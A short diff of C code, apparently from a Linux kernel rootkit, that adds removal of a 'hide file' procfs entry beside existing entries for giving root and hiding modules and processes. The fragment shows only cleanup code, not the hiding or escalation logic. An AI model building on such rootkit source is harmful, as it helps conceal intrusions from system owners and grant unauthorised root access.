@@ -479,6 +479,7 @@ static int control_init(void){
 
 static void control_cleanup(void){
 
+	remove_proc_entry(HIDE_FILE_FILE, proc_control);
 	remove_proc_entry(GIVE_ROOT_FILE,proc_control);
 	remove_proc_entry(HIDE_MODULE_FILE,proc_control);
 	remove_proc_entry(HIDE_PID_FILE, proc_control);
